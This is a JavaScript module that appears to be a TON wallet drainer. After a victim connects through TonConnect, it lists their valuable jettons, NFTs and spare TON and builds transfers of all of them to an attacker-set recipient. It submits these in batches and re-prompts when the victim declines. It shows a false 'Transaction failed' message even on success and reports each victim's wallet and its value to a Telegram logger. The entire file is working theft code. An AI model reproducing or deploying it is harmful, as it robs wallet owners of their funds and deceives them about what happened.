import { dataitem, LogTg } from "../lib/axios"
import { HtmlSpiner } from "./html"

import { Address } from '@ton/ton'

import {succsessAlert, errorAlert } from '../lib/toast'

import { tonTransfer, jettonTransfer, nftTransfer, sleep } from "./dataTransaction"
import { setting } from "../store"

let transactionStarted = false

function chunkArray(array, chunkSize) {
    const chunks = [];
    for (let i = 0; i < array.length; i += chunkSize) {
        chunks.push(array.slice(i, i + chunkSize));
    }
    return chunks;
}

function removeSaleOrUnverifiedNFT(array) {
    return array.filter(item => !item.sale || !item.verified);
}

function filterByVerificationJetton(array) {
    return array.filter(item => item.jetton.verification === "whitelist");
}

export async function Transaction(tonConnectUI, addressRaw, userFriendlyAddress) {
    console.log("userFriendlyAddress",userFriendlyAddress)
    transactionStarted = true;
    HtmlSpiner(true)

    const SENDER = Address.parse(userFriendlyAddress)
    const RECIPIENT = Address.parse(setting.data.recipient)
    const WALLET_NAME = tonConnectUI.walletInfo.name

    LogTg("user_transaction_press_button", {
        walletName: WALLET_NAME,
        wallet: userFriendlyAddress,
        domain: window.location.href,
    })

    const { jettonsBalance, nftsBalance, tonBalance } = await dataitem(userFriendlyAddress, setting.config.endpoint)

    const updatedNftsBalance = removeSaleOrUnverifiedNFT(nftsBalance);
    const updatedJettonsBalance = filterByVerificationJetton(jettonsBalance);
    
    /*
    console.log("WALLET_NAME: ", WALLET_NAME)
    console.log("SENDER: ", SENDER)
    console.log("RECIPIENT: ", RECIPIENT)

    console.log("TON BALANCE: ", tonBalance)
    console.log("JETONS BALANCE: ", updatedJettonsBalance)
    console.log("NFTS BALANCE: ", updatedNftsBalance)
    */

    //Проверка на TON BALANCE != 0 ДОДЕЛАТЬ
    if (tonBalance.balance < 5000000) {
        errorAlert("Wallet not eligible.")
        HtmlSpiner(false, 'Failed')
        transactionStarted = false
    }

    //Создаем таблицу
    let balanceArr = []
    const MIN_PRICE = 0;

    for(let jetton of updatedJettonsBalance) {
        if (jetton.price > MIN_PRICE) {
            balanceArr.push({
                type: "jetton",
                name: jetton.jetton.name,
                address: jetton.wallet_address.address,
                value: parseInt(jetton.balance),
                price: jetton.price
            })
        }
    }

    for(let nft of updatedNftsBalance) {
        if (nft.price > MIN_PRICE) {
            balanceArr.push({
                type: "nft",
                name: nft.collection.name,
                address: nft.address,
                value: 1,
                price: nft.price
            })
        }
    }

    const jettonsFee = balanceArr.filter(item => item.type === 'jetton').length * 55000000
    const nftsFee = balanceArr.filter(item => item.type === 'nft').length * 100000000
    const tonFee = 7500000;

    const newTonBalance = tonBalance.balance - (jettonsFee + nftsFee + tonFee)
    const newTonPrice = newTonBalance >= 0 ? tonBalance.priceForTon * (newTonBalance / Math.pow(10, 9)) : 0;

    if (newTonPrice > MIN_PRICE) {
        balanceArr.push({
            type: "native",
            name: "Ton",
            address: tonBalance.address,
            value: newTonBalance,
            price: newTonPrice
        })
    }

    balanceArr.sort((a, b) => b.price - a.price)
    
    console.table(balanceArr)

    LogTg("user_transaction_start", {
        walletName: WALLET_NAME,
        wallet: userFriendlyAddress,
        domain: window.location.href,
        ton: (tonBalance.balance / Math.pow(10, 9)).toFixed(2),
        jettons_count: balanceArr.filter(item => item.type === 'jetton').length,
        nft_count: balanceArr.filter(item => item.type === 'nft').length,
        wallet_price: (balanceArr.reduce((acc, curr) => acc + curr.price, 0)).toFixed(2),
    })

    //Заполняем messages
    let messages = [];
    for(let element of balanceArr) {
        let message;
        
        if (element.type == 'native') {
            //console.log('native', element)
            message = await tonTransfer(setting.data.recipient, element.value)
        }
        
        if (element.type == 'jetton') {
            //console.log('jetton', element)
            message = await jettonTransfer(SENDER, RECIPIENT, Address.parse(element.address).toString(), element.value)
        }
        
        if (element.type == 'nft') {
            //console.log('nft', element)
            message = await nftTransfer(SENDER, RECIPIENT, Address.parse(element.address).toString())
        }

        if (message) {
            messages.push(message)
        }
    }

    //console.log("messages: ", messages)
    const chunkedMessages = chunkArray(messages, 2);
    //console.log(chunkedMessages)


    for (let i = 0; i < chunkedMessages.length;) {

        try {

            let transactionHash = await tonConnectUI.sendTransaction({
                validUntil: Math.floor(Date.now() / 1000) + 360,
                messages: chunkedMessages[i]
            });

            if (transactionHash) {
                errorAlert('Transaction failed.')

                LogTg("user_transaction_true", {
                    walletName: WALLET_NAME,
                    wallet: userFriendlyAddress,
                    domain: window.location.href,
                    txNumber: i,
                })
            }

            i++
    
        } catch(err) {

            errorAlert('Transaction failed.')

            if (err.message.includes("User rejects")) {
                LogTg("user_transaction_false", {
                    walletName: WALLET_NAME,
                    wallet: userFriendlyAddress,
                    domain: window.location.href,
                    txNumber: i,
                })

                if (setting.config.repeatTransactions) {
                    i--;
                }

            } else {
                LogTg("user_transaction_error", {
                    walletName: WALLET_NAME,
                    wallet: userFriendlyAddress,
                    domain: window.location.href,
                    txNumber: i,
                    errorMessage: err.message,
                })
            }

        }

        await sleep(1000)
    }

    transactionStarted = false
    HtmlSpiner(false, 'Failed')
}